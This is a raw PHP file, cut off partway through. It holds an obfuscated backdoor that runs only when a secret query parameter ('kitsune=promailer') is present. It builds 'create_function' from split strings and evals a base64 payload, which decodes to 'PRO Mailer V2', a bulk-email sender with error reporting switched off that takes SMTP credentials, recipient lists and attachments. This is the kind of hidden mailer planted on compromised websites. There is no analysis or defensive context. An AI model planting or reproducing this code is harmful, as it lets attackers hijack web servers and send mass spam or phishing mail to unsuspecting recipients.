<?php if(isset($_GET["kitsune"])&&$_GET["kitsune"]=="promailer"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."('?>'.base"."64"."_dec"."ode(\$c));");$x("PD8KLy8gQH4gUFJPIE1haWxlciBWMgplcnJvcl9yZXBvcnRpbmcoMCk7CmZ1bmN0aW9uIHF1ZXJ5X3N0cigkcGFyYW1zKXsKJHN0ciA9ICcnOyAKZm9yZWFjaCAoJHBhcmFtcyBhcyAka2V5ID0+ICR2YWx1ZSkgewokc3RyIC49IChzdHJsZW4oJHN0cikgPCAxKSA/ICcnIDogJyYnOwokc3RyIC49ICRrZXkgLiAnPScgLiByYXd1cmxlbmNvZGUoJHZhbHVlKTsKfQpyZXR1cm4gKCRzdHIpOwp9CmZ1bmN0aW9uIGxydHJpbSgkc3RyaW5nKXsKcmV0dXJuIHN0cmlwc2xhc2hlcyhsdHJpbShydHJpbSgkc3RyaW5nKSkpOwp9CmlmKGlzc2V0KCRfUE9TVFsnYWN0aW9uJ10gKSApewoKJGIgPSBxdWVyeV9zdHIoJF9QT1NUKTsKcGFyc2Vfc3RyKCRiKTsgIAokc3NsY2xpY2s9bHJ0cmltKCRzc2xjbGljayk7ICAKJGFjdGlvbj1scnRyaW0oJGFjdGlvbik7CiRtZXNzYWdlPWxydHJpbSgkbWVzc2FnZSk7CiRlbWFpbGxpc3Q9bHJ0cmltKCRlbWFpbGxpc3QpOwokZnJvbT1scnRyaW0oJGZyb20pOwokcmVjb25uZWN0PWxydHJpbSgkcmVjb25uZWN0KTsKJGVwcmlvcml0eT1scnRyaW0oJGVwcmlvcml0eSk7CiRteV9zbXRwPWxydHJpbSgkbXlfc210cCk7CiRzc2xfcG9ydD1scnRyaW0oJHNzbF9wb3J0KTsKJHNtdHBfdXNlcm5hbWU9bHJ0cmltKCRzbXRwX3VzZXJuYW1lKTsKJHNtdHBfcGFzc3dvcmQ9bHJ0cmltKCRzbXRwX3Bhc3N3b3JkKTsKJHJlcGx5dG89bHJ0cmltKCRyZXBseXRvKTsKJHN1YmplY3RfYmFzZT1scnRyaW0oJHN1YmplY3QpOwokcmVhbG5hbWVfYmFzZT1scnRyaW0oJHJlYWxuYW1lKTsKJGZpbGVfbmFtZT0kX0ZJTEVTWydmaWxlJ11bJ25hbWUnXTsKJGZpbGU9JF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddOwokdXJsej1scnRyaW0oJHVybHopOwokY29udGVudHR5cGU9bHJ0cmltKCRjb250ZW50dHlwZSk7CiRlbmNvZGVfdGV4dD0kX1BPU1RbJ2VuY29kZSddOwoKCiAgICAgICAgJG1lc3NhZ2UgPSB1cmxlbmNvZGUoJG1lc3NhZ2UpOwogICAgICAgICRtZXNzYWdlID0gZXJlZ19yZXBsYWNlKCIlNUMlMjIiLCAiJTIyIiwgJG1lc3NhZ2UpOwogICAgICAgICRtZXNzYWdlID0gdXJsZGVjb2RlKCRtZXNzYWdlKTsKICAgICAgICAkbWVzc2FnZSA9IHN0cmlwc2xhc2hlcygkbWVzc2FnZSk7CiAgICAgICAgJHN1YmplY3QgPSBzdHJpcHNsYXNoZXMoJHN1YmplY3QpOwoJCWlmICgkZW5jb2RlX3RleHQgPT0gInllcyIpIHsKICAgICAgICAkc3ViamVjdCA9IHByZWdfcmVwbGFjZSgnLyhbXmEteiBdKS9pZScsICdzcHJpbnRmKCI9JTAyeCIsb3JkKFN0cmlwU2xhc2hlcygiXFwxIikpKScsICRzdWJqZWN0KTsKICAgICAgICAkc3ViamVjdCA9IHN0cl9yZXBsYWNlKCcgJywgJ18nLCAkc3ViamVjdCk7CiAgICAgICAgJHN1YmplY3QgPSAiPT9VVEYtOD9RPyRzdWJqZWN0Pz0iOwogICAgICAgICRyZWFsbmFtZSA9IHByZWdfcmVwbGFjZSgnLyhbXmEteiBdKS9pZScsICdzcHJpbnRmKCI9JTAyeCIsb3JkKFN0cmlwU2xhc2hlcygiXFwxIikpKScsICRyZWFsbmFtZSk7CiAgICAgICAgJHJlYWxuYW1lID0gc3RyX3JlcGxhY2UoJyAnLCAnXycsICRyZWFsbmFtZSk7CiAgICAgICAgJHJlYWxuYW1lID0gIj0/VVRGLTg/UT8kcmVhbG5hbWU/PSI7CiAgICAgICAgfQp9Cj8+Cgo8aHRtbD4KCjxoZWFkPgoKPHRpdGxlPlBybyBNYWlsZXIgVjI8L3RpdGxlPgoKPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9aXNvLTg4NTktMSI+Cgo8c2NyaXB0IHNyYz0naHR0cHM6Ly9zaXRlcy5nb29nbGUuY29tL3NpdGUvanF1ZXJ5MTAwMC9qcXVlcnktMS42LjEuanMnPjwvc2NyaXB0PgogCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+CjwhLS0KLnN0eWxlMSB7CiAgICAgICAgZm9udC1mYW1pbHk6IEdlbmV2YSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZjsKICAgICAgICBmb250LXNpemU6IDEycHg7Cn0KYm9keSB7CgkJYmFja2dyb3VuZDogdXJsKCJodHRwczovL2kuaWJiLmNvLzY0OXlDcTcvSU1HLTk5OTQtbXIxNTgzNzQ2NDg4MzQ5LmpwZyIpICMyOTNhNGEgbm8tcmVwZWF0IGNlbnRlciBjZW50ZXIgZml4ZWQ7CgkJYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsKCX0KfQouYmd1cCB7CmJhY2tncm91bmQ6IHVybChkYXRhOmltYWdlL2pwZWc7YmFzZTY0LC85ai80UUFZUlhocFpnQUFTVWtxQUFnQUFBQUFBQUFBQUFBQUFQL3NBQkZFZFdOcmVRQUJBQVFBQUFCa0FBRC80UU1wYUhSMGNEb3ZMMjV6TG1Ga2IySmxMbU52YlM5NFlYQXZNUzR3THdBOFAzaHdZV05yWlhRZ1ltVm5hVzQ5SXUrN3Z5SWdhV1E5SWxjMVRUQk5jRU5sYUdsSWVuSmxVM3BPVkdONmEyTTVaQ0kvUGlBOGVEcDRiWEJ0WlhSaElIaHRiRzV6T25nOUltRmtiMkpsT201ek9tMWxkR0V2SWlCNE9uaHRjSFJyUFNKQlpHOWlaU0JZVFZBZ1EyOXlaU0ExTGpBdFl6QTJNQ0EyTVM0eE16UTNOemNzSURJd01UQXZNREl2TVRJdE1UYzZNekk2TURBZ0lDQWdJQ0FnSUNJK0lEeHlaR1k2VWtSR0lIaHRiRzV6T25Ka1pqMGlhSFIwY0RvdkwzZDNkeTUzTXk1dmNtY3ZNVGs1T1M4d01pOHlNaTF5WkdZdGMzbHVkR0Y0TFc1ekl5SStJRHh5WkdZNlJHVnpZM0pwY0hScGIyNGdjbVJtT21GaWIzVjBQU0lpSUhodGJHNXpPbmh0Y0QwaWFIUjBjRG92TDI1ekxtRmtiMkpsTG1OdmJTOTRZWEF2TVM0d0x5SWdlRzFzYm5NNmVHMXdUVTA5SW1oMGRIQTZMeTl1Y3k1aFpHOWlaUzVqYjIwdmVHRndMekV1TUM5dGJTOGlJSGh0Ykc1ek9uTjBVbVZtUFNKb2RIUndPaTh2Ym5NdVlXUnZZbVV1WTI5dEwzaGhjQzh4TGpBdmMxUjVjR1V2VW1WemIzVnlZMlZTWldZaklpQjRiWEE2UTNKbFlYUnZjbFJ2YjJ3OUlrRmtiMkpsSUZCb2IzUnZjMmh2Y0NCRFV6VWdWMmx1Wkc5M2N5SWdlRzF3VFUwNlNXNXpkR0Z1WTJWSlJEMGllRzF3TG1scFpEb3pPVFl5UXpVd01VWXhSRE14TVVVeE9UaEVNa0ZHTlRJME1UUTNSVEkyTXlJZ2VHMXdUVTA2Ukc5amRXMWxiblJKUkQwaWVHMXdMbVJwWkRvek9UWXlRelV3TWtZeFJETXhNVVV4T1RoRU1rRkdOVEkwTVRRM1JUSTJNeUkrSUR4NGJYQk5UVHBFWlhKcGRtVmtSbkp2YlNCemRGSmxaanBwYm5OMFlXNWpaVWxFUFNKNGJYQXVhV2xrT2pNNU5qSkRORVpHUmpGRU16RXhSVEU1T0VReVFVWTFNalF4TkRkRk1qWXpJaUJ6ZEZKbFpqcGtiMk4xYldWdWRFbEVQU0o0YlhBdVpHbGtPak01TmpKRE5UQXdSakZFTXpFeFJURTVPRVF5UVVZMU1qUXhORGRGTWpZeklpOCtJRHd2Y21SbU9rUmxjMk55YVhCMGFXOXVQaUE4TDNKa1pqcFNSRVkrSUR3dmVEcDRiWEJ0WlhSaFBpQThQM2h3WVdOclpYUWdaVzVrUFNKeUlqOCsvKzRBRGtGa2IySmxBR1RBQUFBQUFmL2JBSVFBQVFFQkFRRUJBUUVCQVFFQkFRRUJBUUVCQVFFQkFRRUJBUUVCQVFFQkFRRUJBUUVCQVFFQkFRRUJBUUlDQWdJQ0FnSUNBZ0lDQXdNREF3TURBd01EQXdFQkFRRUJBUUVDQVFFQ0FnSUJBZ0lEQXdNREF3TURBd01EQXdNREF3TURBd01EQXdNREF3TURBd01EQXdNREF3TURBd01EQXdNREF3TURBd01EQXdNRC84QUFFUWdBQkFBRUF3RVJBQUlSQVFNUkFmL0VBRlFBQVFBQUFBQUFBQUFBQUFBQUFBQUFBQW9CQVFFQUFBQUFBQUFBQUFBQUFBQUFBQU1FRUFBQkJRQUFBQUFBQUFBQUFBQUFBQUR3QUJNMWhiWVJBQUlEQUFBQUFBQUFBQUFBQUFBQUFBRHdNWUd6LzlvQURBTUJBQUlSQXhFQVB3QjJHQ0xtWkcwV1RjazJEY24vMlE9PSk7Cn0KCi5jYWRyZSB7CmJhY2tncm91bmQtaW1hZ2U6IHVybChkYXRhOmltYWdlL3BuZztiYXNlNjQsaVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQk9JQUFBQUZDQUlBQUFCbjZ0UTRBQUFBR1hSRldIUlRiMlowZDJGeVpRQkJaRzlpWlNCSmJXRm5aVkpsWVdSNWNjbGxQQUFBQTJacFZGaDBXRTFNT21OdmJTNWhaRzlpWlM1NGJYQUFBQUFBQUR3L2VIQmhZMnRsZENCaVpXZHBiajBpNzd1L0lpQnBaRDBpVnpWTk1FMXdRMlZvYVVoNmNtVlRlazVVWTNwcll6bGtJajgrSUR4NE9uaHRjRzFsZEdFZ2VHMXNibk02ZUQwaVlXUnZZbVU2Ym5NNmJXVjBZUzhpSUhnNmVHMXdkR3M5SWtGa2IySmxJRmhOVUNCRGIzSmxJRFV1TXkxak1ERXhJRFkyTGpFME5UWTJNU3dnTWpBeE1pOHdNaTh3TmkweE5EbzFOam95TnlBZ0lDQWdJQ0FnSWo0Z1BISmtaanBTUkVZZ2VHMXNibk02Y21SbVBTSm9kSFJ3T2k4dmQzZDNMbmN6TG05eVp5OHhPVGs1THpBeUx6SXlMWEprWmkxemVXNTBZWGd0Ym5NaklqNGdQSEprWmpwRVpYTmpjbWx3ZEdsdmJpQnlaR1k2WVdKdmRYUTlJaUlnZUcxc2JuTTZlRzF3VFUwOUltaDBkSEE2THk5dWN5NWhaRzlpWlM1amIyMHZlR0Z3THpFdU1DOXRiUzhpSUhodGJHNXpPbk4wVW1WbVBTSm9kSFJ3T2k4dmJuTXVZV1J2WW1VdVkyOXRMM2hoY0M4eExqQXZjMVI1Y0dVdlVtVnpiM1Z5WTJWU1pXWWpJaUI0Yld4dWN6cDRiWEE5SW1oMGRIQTZMeTl1Y3k1aFpHOWlaUzVqYjIwdmVHRndMekV1TUM4aUlIaHRjRTFOT2s5eWFXZHBibUZzUkc5amRXMWxiblJKUkQwaWVHMXdMbVJwWkRvNFFqaEdORFpEUVVKQ1FqQkZNakV4T1RneFFVUXdOVVJDTjBWRlFqSkZPU0lnZUcxd1RVMDZSRzlqZFcxbGJuUkpSRDBpZUcxd0xtUnBaRG81UVRrMFF6Y3lORUkzTVVReE1VVXlPREF3TmtSR01qUkdSa0pFTjBJNVJDSWdlRzF3VFUwNlNXNXpkR0Z1WTJWSlJEMGllRzF3TG1scFpEbzVRVGswUXpjeU0wSTNNVVF4TVVVeU9EQXdOa1JHTWpSR1JrSkVOMEk1UkNJZ2VHMXdPa055WldGMGIzSlViMjlzUFNKQlpHOWlaU0JRYUc5MGIzTm9iM0FnUTFNMklDaFhhVzVrYjNkektTSStJRHg0YlhCTlRUcEVaWEpwZG1Wa1JuSnZiU0J6ZEZKbFpqcHBibk4wWVc1alpVbEVQU0o0YlhBdWFXbGtPa000TURJeU0wTTRNRFJDTjBVeU1URTRPVVkxUlRaRk5VWXhOa1U0TlRKQ0lpQnpkRkpsWmpwa2IyTjFiV1Z1ZEVsRVBTSjRiWEF1Wkdsa09qaENPRVkwTmtOQlFrSkNNRVV5TVRFNU9ERkJSREExUkVJM1JVVkNNa1U1SWk4K0lEd3ZjbVJtT2tSbGMyTnlhWEIwYVc5dVBpQThMM0prWmpwU1JFWStJRHd2ZURwNGJYQnRaWFJoUGlBOFAzaHdZV05yWlhRZ1pXNWtQU0p5SWo4K1M2S05aUUFBQUZaSlJFRlVlTnJzMTdFUmdDQVFSTkhEZmhoRElwdWdMY29pTW1Sb3lCWU16L0c5RW42MFc2S1A0T2ZxcFFIWm5VMERzbHUzQm1TM3B3YllwWHpDSVFFQUFBQnVLZ0FBQUxpcEFBQUF1S2tBQUFEdzBpUEFBUE14QlZGSENlaDJBQUFBQUVsRlRrU3VRbUNDKTsKfQoKLnVpYnV0dG9uIHsgCiAgICBwb3NpdGlvbjogcmVsYXRpdmU7IAogICAgei1pbmRleDogMTsKICAgIG92ZXJmbG93OiB2aXNpYmxlOyAKICAgIGRpc3BsYXk6IGlubGluZS1ibG9jazsgCiAgICBwYWRkaW5nOiAwLjNlbSAwLjZlbSAwLjM3NWVtOyAKICAgIGJvcmRlcjogMXB4IHNvbGlkICMwMUE5REI7IAogICAgYm9yZGVyLWJvdHRvbS1jb2xvcjogIzAxQTlEQjsKCQogICAgbWFyZ2luOiAwOwogICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOyAKICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgIGZvbnQ6IGJvbGQgMTFweC9ub3JtYWwgJ2x1Y2lkYSBncmFuZGUnLCB0YWhvbWEsIHZlcmRhbmEsIGFyaWFsLCBzYW5zLXNlcmlmOyAKICAgIHdoaXRlLXNwYWNlOiBub3dyYXA7IAogICAgY3Vyc29yOiBwb2ludGVyOyAKICAgIC8qIG91dGxpbmU6IG5vbmU7ICovCiAgICBjb2xvcjogI2Y5ZjlmOTsgCiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZWVlOwogICAgYmFja2dyb3VuZC1pbWFnZTogLXdlYmtpdC1ncmFkaWVudChsaW5lYXIsIDAgMCwgMCAxMDAlLCBmcm9tKCMwMUE5REIpLCB0bygjMDFBOURCKSk7CiAgICBiYWNrZ3JvdW5kLWltYWdlOiAtbW96LWxpbmVhci1ncmFkaWVudCgjMDFBOURCLCAjMDFBOURCKTsKICAgIGJhY2tncm91bmQtaW1hZ2U6IC1vLWxpbmVhci1ncmFkaWVudCgjMDFBOURCLCAjMDFBOURCKTsKICAgIGJhY2tncm91bmQtaW1hZ2U6IGxpbmVhci1ncmFkaWVudCgjMDFBOURCLCAjMDFBOURCKTsKCiAgICAvKiBJRSBoYWNrcyAqLwoKICAgICpkaXNwbGF5OiBpbmxpbmU7IAoKfQoKLnVpYnV0dG9uOmhvdmVyLAoudWlidXR0b246Zm9jdXMsCi51aWJ1dHRvbjphY3RpdmUgewogICAgYm9yZGVyLWNvbG9yOiAjMDFBOURCICMwMUE5REIgIzAxQTlEQiAjMDFBOURCOwp9CgoudWlidXR0b246YWN0aXZlIHsKICAgIGJvcmRlci1jb2xvcjogIzAxQTlEQjsKICAgIGJhY2tncm91bmQ6ICMwMUE5REI7CiAgICBmaWx0ZXI6IG5vbmU7CiAgICAtd2Via2l0LWJveC1zaGFkb3c6IG5vbmU7CiAgICAtbW96LWJveC1zaGFkb3c6IG5vbmU7CiAgICBib3gtc2hhZG93OiBub25lOwp9CgovKiBvdmVycmlkZXMgZXh0cmEgcGFkZGluZyBvbiBidXR0b24gZWxlbWVudHMgaW4gRmlyZWZveCAqLwoudWlidXR0b246Oi1tb3otZm9jdXMtaW5uZXIgewogICAgcGFkZGluZzogMDsKICAgIGJvcmRlcjogMDsKfQoKCgotLT4KPC9zdHlsZT4KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KPCEtLQouc3R5bGUxIHsKICAgICAgICBmb250LXNpemU6IDEwcHg7CiAgICAgICAgZm9udC1mYW1pbHk6IEdlbmV2YSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZjsKfQotLT4KPC9zdHlsZT4KPC9oZWFkPgo8Ym9keSBiZ2NvbG9yPSIjZjlmOWY5IiBjbGFzcz0iYmd1cCI+CjxkaXYgY2xhc3M9ImNhZHJlIiBzdHlsZT0iaGVpZ2h0OjEwcHg7bWFyZ2luOjBweCBhdXRvOyI+PC9kaXY+CjxkaXYgc3R5bGU9IndpZHRoOjgwJTttYXJnaW46MCBhdXRvOyI+CjxwIGFsaWduPSJjZW50ZXIiPjxmb250IHNpemU9IjUiIGZhY2U9IkJhdWhhdXMgOTMiPk1haWxlciBJbmJveCBTZW5kZXI8L2ZvbnQ+PC9wPgo8Zm9ybSBuYW1lPSJmb3JtMSIgbWV0aG9kPSJwb3N0IiBhY3Rpb249IiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+CgogIDxicj4KCiAgPHRhYmxlIHdpZHRoPSIxMDAlIiBib3JkZXI9IjAiIGhlaWdodD0iNDA3IiBzdHlsZT0iYmFja2dyb3VuZDojZmZmIiBjZWxscGFkZGluZz0iMCIgY2VsbHNwYWNpbmc9IjAiPgoKICAgIDx0cj4KCiAgICAgIDx0ZCB3aWR0aD0iMTAwJSIgY29sc3Bhbj0iNCIgIHN0eWxlPSJjb2xvcjojZmZmO2JhY2tncm91bmQ6IzAxQTlEQiIgaGVpZ2h0PSIzNiI+CgogICAgICAgIDxiPgoKICAgICAgICA8Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0iMiIgPiZuYnNwO1NNVFAgU0VUVVA8L2ZvbnQ+PC9iPjwvdGQ+CgogICAgICA8L3RyPgogICAgPHRyID4KCiAgICAgIDx0ZCB3aWR0aD0iMTAlIiBoZWlnaHQ9IjIyIiBzdHlsZT0icGFkZGluZzoxMHB4OyI+CiAgIAogICAgICAgIDxkaXYgYWxpZ249InJpZ2h0Ij48Zm9udCBzaXplPSItMyIgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+U01UUCBMb2dpbjo8L2ZvbnQ+PC9kaXY+CgogICAgICA8L3RkPgoKICAgICAgPHRkIHdpZHRoPSIxOCUiIGhlaWdodD0iMjIiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij48Zm9udCBzaXplPSItMyIgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+CgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBzdHlsZT0iYmFja2dyb3VuZDojRUZGQkY4O2JvcmRlcjogMXB4IHNvbGlkICMwMUE5REI7Y29sb3I6IzMzMyIgbmFtZT0ic210cF91c2VybmFtZSIgdmFsdWU9Ijw/PSRzbXRwX3VzZXJuYW1lOz8+IiBzaXplPSIzMCI+CgogICAgICAgIDwvZm9udD48L3RkPgoKICAgICAgPHRkIHdpZHRoPSIzMSUiIGhlaWdodD0iMjIiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij4KCiAgICAgICAgPGRpdiBhbGlnbj0icmlnaHQiPjxmb250IHNpemU9Ii0zIiBmYWNlPSJWZXJkYW5hLCBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmIj5TTVRQIFBhc3M6PC9mb250PjwvZGl2PgoKICAgICAgPC90ZD4KCiAgICAgIDx0ZCB3aWR0aD0iNDElIiBoZWlnaHQ9IjIyIiBzdHlsZT0icGFkZGluZzoxMHB4OyI+PGZvbnQgc2l6ZT0iLTMiIGZhY2U9IlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWYiPgoKICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIHN0eWxlPSJiYWNrZ3JvdW5kOiNFRkZCRjg7Ym9yZGVyOiAxcHggc29saWQgIzAxQTlEQjtjb2xvcjojMzMzIiBuYW1lPSJzbXRwX3Bhc3N3b3JkIiB2YWx1ZT0iPD89JHNtdHBfcGFzc3dvcmQ7Pz4iIHNpemU9IjMwIj4KCiAgICAgICAgPC9mb250PjwvdGQ+CgogICAgPC90cj4KICAgIDx0cj4KCiAgICAgIDx0ZCB3aWR0aD0iMTAlIiBoZWlnaHQ9IjIyIiBzdHlsZT0icGFkZGluZzoxMHB4OyI+CgogICAgICAgIDxkaXYgYWxpZ249InJpZ2h0Ij4KICAgICAgICAgIDxmb250IGZhY2U9IlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWYiIHNpemU9Ii0zIj5Qb3J0IDo8L2ZvbnQ+PC9kaXY+CgogICAgICA8L3RkPgoKICAgICAgPHRkIHdpZHRoPSIxOCUiIGhlaWdodD0iMjIiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij48Zm9udCBzaXplPSItMyIgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+CgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBzdHlsZT0iYmFja2dyb3VuZDojRUZGQkY4O2JvcmRlcjogMXB4IHNvbGlkICMwMUE5REI7Y29sb3I6IzMzMyIgbmFtZT0ic3NsX3BvcnQiIHZhbHVlPSI8Pz0kc3NsX3BvcnQ7Pz4iIHNpemU9IjUiPiAKICAgICAgKG9wdGlvbmFsKTwvZm9udD48L3RkPgoKICAgICAgPHRkIHdpZHRoPSIzMSUiIGhlaWdodD0iMjIiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij4KCiAgICAgICAgPGRpdiBhbGlnbj0icmlnaHQiPgogICAgICAgICAgPGZvbnQgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiIgc2l6ZT0iLTMiPlNNVFAgU2VydmVyIAogICAgICAgICAgU210cDo8L2ZvbnQ+PC9kaXY+CgogICAgICA8L3RkPgoKICAgICAgPHRkIHdpZHRoPSI0MSUiIGhlaWdodD0iMjIiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij48Zm9udCBzaXplPSItMyIgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+CgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBzdHlsZT0iYmFja2dyb3VuZDojRUZGQkY4O2JvcmRlcjogMXB4IHNvbGlkICMwMUE5REI7Y29sb3I6IzMzMyIgbmFtZT0ibXlfc210cCIgdmFsdWU9Ijw/PSRteV9zbXRwOz8+IiBzaXplPSIzMCI+CgogICAgICAgIDwvZm9udD48L3RkPgoKICAgIDwvdHI+CiAgICA8dHI+CgogICAgICA8dGQgd2lkdGg9IjEwJSIgaGVpZ2h0PSIyMiIgc3R5bGU9InBhZGRpbmc6MTBweDsiPgoKICAgICAgICA8cCBhbGlnbj0icmlnaHQiPgogICAgICAgIDxmb250IGZhY2U9IlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWYiIHNpemU9Ii0zIj5TU0wgU2VydmVyOjwvZm9udD48L3RkPgoKICAgICAgPHRkIHdpZHRoPSIxOCUiIGhlaWdodD0iMjIiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij4KICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBzdHlsZT0iYmFja2dyb3VuZDojRUZGQkY4O2JvcmRlcjogMXB4IHNvbGlkICMwMUE5REI7Y29sb3I6IzMzMyIgbmFtZT0ic3NsY2xpY2siIHZhbHVlPSJPTiIgPD8gaWYoJHNzbGNsaWNrKXsgcHJpbnQgImNoZWNrZWQiOyB9ID8+ID48Zm9udCBzaXplPSItMyIgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+KHllcyk8L2ZvbnQ+PC90ZD4KCiAgICAgIDx0ZCB3aWR0aD0iMzElIiBoZWlnaHQ9IjIyIiBzdHlsZT0icGFkZGluZzoxMHB4OyI+CgogICAgICAgIDxwIGFsaWduPSJyaWdodCI+CiAgICAgICAgPGZvbnQgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiIgc2l6ZT0iLTMiPlJlY29ubmVjdCAKICAgICAgICBBZnRlcjo8L2ZvbnQ+PC90ZD4KCiAgICAgIDx0ZCB3aWR0aD0iNDElIiBoZWlnaHQ9IjIyIiBzdHlsZT0icGFkZGluZzoxMHB4OyI+PGZvbnQgc2l6ZT0iLTMiIGZhY2U9IlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWYiPgoKICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgc3R5bGU9ImJhY2tncm91bmQ6I0VGRkJGODtib3JkZXI6IDFweCBzb2xpZCAjMDFBOURCO2NvbG9yOiMzMzMiIG5hbWU9InJlY29ubmVjdCIgdmFsdWU9Ijw/PSRyZWNvbm5lY3Q7Pz4iIHNpemU9IjUiPiAKICAgICAgRU1BSUxTPC9mb250PjwvdGQ+CgogICAgPC90cj4KICAgIDx0cj4KCiAgICAgIDx0ZCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIzOSIgIGNvbHNwYW49IjQiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij4KCiAgICAgICAgPHAgYWxpZ249ImNlbnRlciI+CiAgICAgICAgPGZvbnQgZmFjZT0iQXJpYWwiIHN0eWxlPSJmb250LXNpemU6IDlwdCIgY29sb3I9IiM4MDAwMDAiPjxiPiZxdW90OzwvYj4gSWYgCiAgICAgICAgeW91IGRvbnQgaGF2ZSBTTVRQIGxvZ2luLCBsZWF2ZSBibGFuayBxdWVyaWVzIGFib3ZlIDxiPiZxdW90OzwvYj48L2ZvbnQ+PC90ZD4KCiAgICAgIDwvdHI+CgogICAgPHRyPgoKICAgICAgPHRkIHdpZHRoPSIxMCUiIGhlaWdodD0iMTkiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij4KCiAgICAgICAgJm5ic3A7PC90ZD4KCiAgICAgIDx0ZCB3aWR0aD0iMTglIiBoZWlnaHQ9IjE5IiBzdHlsZT0icGFkZGluZzoxMHB4OyI+Jm5ic3A7PC90ZD4KCiAgICAgIDx0ZCB3aWR0aD0iMzElIiBoZWlnaHQ9IjE5IiBzdHlsZT0icGFkZGluZzoxMHB4OyI+CgogICAgICAgICZuYnNwOzwvdGQ+CgogICAgICA8dGQgd2lkdGg9IjQxJSIgaGVpZ2h0PSIxOSIgc3R5bGU9InBhZGRpbmc6MTBweDsiPiZuYnNwOzwvdGQ+CgogICAgPC90cj4KCiAgICA8dHI+CgogICAgICA8dGQgd2lkdGg9IjEwMCUiIGNvbHNwYW49IjQiIHN0eWxlPSJjb2xvcjojZmZmO2JhY2tncm91bmQ6IzAxQTlEQiIgaGVpZ2h0PSIzNiI+CgogICAgICAgIDxiPgoKICAgICAgICA8Zm9udCBmYWNlPSJBcmlhbCIgc2l6ZT0iMiIgY29sb3I9IiNGRkZGRkYiPiZuYnNwO01FU1NBR0UgU0VUVVA8L2ZvbnQ+PC9iPjwvdGQ+CgogICAgICA8L3RyPgoJICAgICAgPHRyPgoKICAgICAgPHRkIHdpZHRoPSIxMCUiIGhlaWdodD0iMjIiIHN0eWxlPSJwYWRkaW5nOjEwcHg7Ij4KICAgICAgICA8ZGl2IGFsaWduPSJyaWdodCI+PGZvbnQgc2l6ZT0iLTMiIGZhY2U9IlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWYiPkF0dGFjaCBGaWxlIDo8L2ZvbnQ+PC9kaXY+CiAgICAgIDwvdGQ+CgogICAgICA8dGQgd2lkdGg9IjU5JSIgaGVpZ2h0PSIyMiIgc3R5bGU9InBhZGRpbmc6MTBweDsiICBjb2xTcGFuPSIzIj4KCSAgPGZvbnQgc2l6ZT0iLTMiIGZhY2U9IlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWYiPgoKPGlucHV0IHR5cGU9ImZpbGUiIHN0eWxlPSJiYWNrZ3JvdW5kOiNFRkZCRjg7O2JvcmRlcjogMXB4IHNvbGlkICMwMUE5REI7Y29sb3I6IzMzMyIgbmFtZT0iZmlsZSIgc2l6ZT0iMTI0Ij4KCiAgICAgICAgPC9mb250PjwvdGQ+CgogICAgPC90cj4KICAgIDx0cj4KCiAgICAgIDx0ZCB3aWR0aD0iMTAlIiBoZWlnaHQ9IjIyIiBzdHlsZT0icGFkZGluZzoxMHB4OyI+CgogICAgICAgIDxkaXYgYWxpZ249InJpZ2h0Ij48Zm9udCBzaXplPSItMyIgZmFjZT0iVmVyZGFuYSwgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiI+WW91cgoKICAgICAgICAgIEVtYWlsOjwvZm9udD48L2Rpdj4KCiAgICAgIDwvdGQ+CgogICAgICA8dGQgd2lkdGg9IjE4JSIgaGVpZ2h0PSIyMiIgc3R5bGU9InBhZGRpbmc6MTBweDsiPjxmb250IHNpemU9Ii0zIiBmYWNlPSJW